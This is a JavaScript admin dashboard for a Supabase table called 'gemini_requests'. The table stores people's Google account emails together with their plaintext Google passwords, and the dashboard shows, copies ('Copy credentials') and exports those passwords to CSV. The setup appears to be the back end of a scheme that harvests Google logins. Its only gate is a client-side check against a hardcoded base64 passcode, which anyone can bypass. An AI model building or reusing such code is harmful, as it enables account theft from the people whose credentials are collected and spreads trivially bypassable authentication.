// Admin Dashboard JavaScript

let supabaseClient = null;
let allData = [];
let filteredData = [];
let currentPage = 1;
let itemsPerPage = 10;

// Check authentication
function checkAuth() {
    const adminAuth = sessionStorage.getItem('adminAuth');
    const correctHash = btoa('200320');
    
    if (adminAuth !== correctHash) {
        window.location.href = 'index.html';
        return false;
    }
    return true;
}

// Initialize Supabase
function initSupabase() {
    if (typeof window.SUPABASE_CONFIG !== 'undefined' && window.SUPABASE_CONFIG.url && window.SUPABASE_CONFIG.anonKey) {
        if (typeof window.supabase !== 'undefined') {
            const { createClient } = window.supabase;
            supabaseClient = createClient(
                window.SUPABASE_CONFIG.url,
                window.SUPABASE_CONFIG.anonKey
            );
        }
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    if (!checkAuth()) return;
    
    initSupabase();
    loadData();
});

// Load data from Supabase
async function loadData() {
    if (!supabaseClient) {
        showNotification('Supabase not configured!', 'error');
        return;
    }
    
    try {
        const { data, error } = await supabaseClient
            .from('gemini_requests')
            .select('*')
            .order('created_at', { ascending: false });
        
        if (error) throw error;
        
        allData = data || [];
        filteredData = [...allData];
        updateStatistics();
        applyFilters();
        
    } catch (error) {
        console.error('Error loading data:', error);
        showNotification('Error loading data: ' + error.message, 'error');
    }
}

// Refresh data
async function refreshData() {
    showNotification('Refreshing...', 'info');
    await loadData();
    showNotification('Data refreshed!', 'success');
}

// Update statistics
function updateStatistics() {
    const total = allData.length;
    const pending = allData.filter(item => item.status === 'pending').length;
    const completed = allData.filter(item => item.status === 'completed').length;
    const rejected = allData.filter(item => item.status === 'rejected').length;
    
    document.getElementById('totalCount').textContent = total;
    document.getElementById('pendingCount').textContent = pending;
    document.getElementById('completedCount').textContent = completed;
    document.getElementById('rejectedCount').textContent = rejected;
}

// Apply filters
function applyFilters() {
    const statusFilter = document.getElementById('filterStatus').value;
    const searchEmail = document.getElementById('searchEmail').value.toLowerCase();
    const sortBy = document.getElementById('sortBy').value;
    
    // Filter
    filteredData = allData.filter(item => {
        const statusMatch = statusFilter === 'all' || item.status === statusFilter;
        const emailMatch = searchEmail === '' || 
                          item.google_email.toLowerCase().includes(searchEmail) ||
                          item.contact_email.toLowerCase().includes(searchEmail);
        return statusMatch && emailMatch;
    });
    
    // Sort
    filteredData.sort((a, b) => {
        switch(sortBy) {
            case 'created_at_desc':
                return new Date(b.created_at) - new Date(a.created_at);
            case 'created_at_asc':
                return new Date(a.created_at) - new Date(b.created_at);
            case 'email_asc':
                return a.google_email.localeCompare(b.google_email);
            case 'email_desc':
                return b.google_email.localeCompare(a.google_email);
            default:
                return 0;
        }
    });
    
    currentPage = 1;
    renderTable();
}

// Reset filters
function resetFilters() {
    document.getElementById('filterStatus').value = 'all';
    document.getElementById('searchEmail').value = '';
    document.getElementById('sortBy').value = 'created_at_desc';
    applyFilters();
}

// Render table
function renderTable() {
    const tbody = document.getElementById('tableBody');
    const start = (currentPage - 1) * itemsPerPage;
    const end = start + itemsPerPage;
    const pageData = filteredData.slice(start, end);
    
    if (pageData.length === 0) {
        tbody.innerHTML = '<tr><td colspan="8" class="no-data">No data found</td></tr>';
        updatePagination();
        return;
    }
    
    tbody.innerHTML = pageData.map(item => `
        <tr>
            <td><input type="checkbox" class="row-select" data-id="${item.id}"></td>
            <td>${item.id}</td>
            <td class="email-cell">${escapeHtml(item.google_email)}</td>
            <td class="password-cell">
                <span class="password-masked">••••••••</span>
                <button class="btn-icon" onclick="showPassword(${item.id}, '${escapeHtml(item.google_password)}')" title="Show password">👁️</button>
            </td>
            <td class="email-cell">${escapeHtml(item.contact_email)}</td>
            <td><span class="status-badge status-${item.status}">${item.status}</span></td>
            <td class="date-cell">${formatDate(item.created_at)}</td>
            <td class="actions-cell">
                <button class="btn-icon" onclick="viewDetails(${item.id})" title="View">👁️</button>
                <button class="btn-icon" onclick="editItem(${item.id})" title="Edit">✏️</button>
                <button class="btn-icon btn-danger" onclick="deleteItem(${item.id})" title="Delete">🗑️</button>
                <button class="btn-icon" onclick="copyCredentials(${item.id})" title="Copy credentials">📋</button>
            </td>
        </tr>
    `).join('');
    
    updatePagination();
}

// Pagination
function updatePagination() {
    const totalPages = Math.ceil(filteredData.length / itemsPerPage);
    document.getElementById('pageInfo').textContent = `Page ${currentPage} of ${totalPages}`;
    document.getElementById('prevBtn').disabled = currentPage === 1;
    document.getElementById('nextBtn').disabled = currentPage === totalPages || totalPages === 0;
}

function previousPage() {
    if (currentPage > 1) {
        currentPage--;
        renderTable();
    }
}

function nextPage() {
    const totalPages = Math.ceil(filteredData.length / itemsPerPage);
    if (currentPage < totalPages) {
        currentPage++;
        renderTable();
    }
}

// Select all
function toggleSelectAll() {
    const selectAll = document.getElementById('selectAll');
    const checkboxes = document.querySelectorAll('.row-select');
    checkboxes.forEach(cb => cb.checked = selectAll.checked);
}

// View details
function viewDetails(id) {
    const item = allData.find(i => i.id === id);
    if (!item) return;
    
    const details = `
        <div class="detail-item"><strong>ID:</strong> ${item.id}</div>
        <div class="detail-item"><strong>Google Email:</strong> ${escapeHtml(item.google_email)}</div>
        <div class="detail-item"><strong>Password:</strong> ${escapeHtml(item.google_password)}</div>
        <div class="detail-item"><strong>Contact Email:</strong> ${escapeHtml(item.contact_email)}</div>
        <div class="detail-item"><strong>Status:</strong> <span class="status-badge status-${item.status}">${item.status}</span></div>
        <div class="detail-item"><strong>Created At:</strong> ${formatDate(item.created_at)}</div>
        <div class="detail-item"><strong>Updated At:</strong> ${item.updated_at ? formatDate(item.updated_at) : 'N/A'}</div>
    `;
    
    document.getElementById('viewDetails').innerHTML = details;
    document.getElementById('viewModal').classList.add('active');
}

function closeViewModal() {
    document.getElementById('viewModal').classList.remove('active');
}

// Edit item
function editItem(id) {
    const item = allData.find(i => i.id === id);
    if (!item) return;
    
    document.getElementById('editId').value = item.id;
    document.getElementById('editGoogleEmail').value = item.google_email;
    document.getElementById('editPassword').value = item.google_password;
    document.getElementById('editContactEmail').value = item.contact_email;
    document.getElementById('editStatus').value = item.status;
    
    document.getElementById('editModal').classList.add('active');
}

function closeEditModal() {
    document.getElementById('editModal').classList.remove('active');
    document.getElementById('editForm').reset();
}

function toggleEditPassword() {
    const input = document.getElementById('editPassword');
    const btn = input.nextElementSibling;
    if (input.type === 'password') {
        input.type = 'text';
        btn.textContent = '🙈';
    } else {
        input.type = 'password';
        btn.textContent = '👁️';
    }
}

async function saveEdit(event) {
    event.preventDefault();
    
    const id = document.getElementById('editId').value;
    const updateData = {
        google_email: document.getElementById('editGoogleEmail').value,
        google_password: document.getElementById('editPassword').value,
        contact_email: document.getElementById('editContactEmail').value,
        status: document.getElementById('editStatus').value,
        updated_at: new Date().toISOString()
    };
    
    try {
        const { error } = await supabaseClient
            .from('gemini_requests')
            .update(updateData)
            .eq('id', id);
        
        if (error) throw error;
        
        showNotification('Updated successfully!', 'success');
        closeEditModal();
        await loadData();
        
    } catch (error) {
        console.error('Error updating:', error);
        showNotification('Error updating: ' + error.message, 'error');
    }
}

// Delete item
async function deleteItem(id) {
    if (!confirm('Are you sure you want to delete this item?')) return;
    
    try {
        const { error } = await supabaseClient
            .from('gemini_requests')
            .delete()
            .eq('id', id);
        
        if (error) throw error;
        
        showNotification('Deleted successfully!', 'success');
        await loadData();
        
    } catch (error) {
        console.error('Error deleting:', error);
        showNotification('Error deleting: ' + error.message, 'error');
    }
}

// Delete selected
async function deleteSelected() {
    const selected = Array.from(document.querySelectorAll('.row-select:checked'))
                          .map(cb => parseInt(cb.getAttribute('data-id')));
    
    if (selected.length === 0) {
        showNotification('No items selected!', 'error');
        return;
    }
    
    if (!confirm(`Delete ${selected.length} selected items?`)) return;
    
    try {
        const { error } = await supabaseClient
            .from('gemini_requests')
            .delete()
            .in('id', selected);
        
        if (error) throw error;
        
        showNotification(`Deleted ${selected.length} items!`, 'success');
        document.getElementById('selectAll').checked = false;
        await loadData();
        
    } catch (error) {
        console.error('Error deleting:', error);
        showNotification('Error deleting: ' + error.message, 'error');
    }
}

// Show password
function showPassword(id, password) {
    alert(`Password for ID ${id}:\n\n${password}`);
}

// Copy credentials
function copyCredentials(id) {
    const item = allData.find(i => i.id === id);
    if (!item) return;
    
    const text = `Email: ${item.google_email}\nPassword: ${item.google_password}`;
    
    navigator.clipboard.writeText(text).then(() => {
        showNotification('Credentials copied to clipboard!', 'success');
    }).catch(() => {
        showNotification('Failed to copy!', 'error');
    });
}

// Export to CSV
function exportToCSV() {
    const csv = [
        ['ID', 'Google Email', 'Password', 'Contact Email', 'Status', 'Created At', 'Updated At'],
        ...filteredData.map(item => [
            item.id,
            item.google_email,
            item.google_password,
            item.contact_email,
            item.status,
            item.created_at,
            item.updated_at || ''
        ])
    ].map(row => row.join(',')).join('\n');
    
    const blob = new Blob([csv], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `gemini_requests_${new Date().toISOString().split('T')[0]}.csv`;
    a.click();
    URL.revokeObjectURL(url);
    
    showNotification('CSV exported!', 'success');
}

// Logout
function logout() {
    if (confirm('Are you sure you want to logout?')) {
        sessionStorage.removeItem('adminAuth');
        window.location.href = 'index.html';
    }
}

// Utility functions
function formatDate(dateString) {
    if (!dateString) return 'N/A';
    const date = new Date(dateString);
    return date.toLocaleString('vi-VN');
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `admin-notification notification-${type}`;
    notification.textContent = message;
    document.body.appendChild(notification);
    
    setTimeout(() => notification.classList.add('show'), 10);
    
    setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => notification.remove(), 300);
    }, 3000);
}

